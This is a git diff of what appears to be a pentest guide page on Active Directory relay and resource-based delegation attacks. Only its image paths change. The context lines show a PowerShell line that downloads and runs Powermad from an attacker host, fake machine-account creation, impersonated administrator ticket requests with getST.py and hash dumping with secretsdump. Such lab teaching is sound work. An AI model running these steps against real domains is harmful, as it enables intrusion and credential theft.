@@ -64,7 +64,7 @@ Abuse the lockscreen image changing functionality to achieve a webdav network au
 crackmapexec ldap 10.0.0.5 -u richard -p Sample123 -M MAQ
 ```
 
-![](<../../../../.gitbook/assets/image (9) (1) (1) (1) (1).png>)
+![](<../../../../.gitbook/assets/image (9) (1) (1) (1) (1) (1).png>)
 
 The machine account qouta is 10, meaning we (all authenticated users) can create our own computerobject in the domain.
 
@@ -75,7 +75,7 @@ iex (iwr http://192.168.248.3:8090/Powermad.ps1 -usebasicparsing)
 New-MachineAccount -MachineAccount FAKE01 -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
 ```
 
-![](<../../../../.gitbook/assets/image (56) (1) (1).png>)
+![](<../../../../.gitbook/assets/image (56) (1) (1) (1).png>)
 
 3\. Create a DNS record for webdav to our attacking machine with Invoke-DNSUpdate. The DNS record is required for webdav connection to work. It won't connect through an IP only with a hostname.
 
@@ -119,7 +119,7 @@ If we open the attribute editor on DC02 for WEB01 we can see the `msDS-AllowedTo
 getST.py amsterdam/FAKE01@10.0.0.5 -spn cifs/web01.amsterdam.bank.local -impersonate administrator -dc-ip 10.0.0.3
 ```
 
-![](<../../../../.gitbook/assets/image (32) (1) (1).png>)
+![](<../../../../.gitbook/assets/image (32) (1) (1) (1).png>)
 
 7\. Use this ticket and run `secretsdump.py` to dump the local admin hashes of `WEB01`.
 
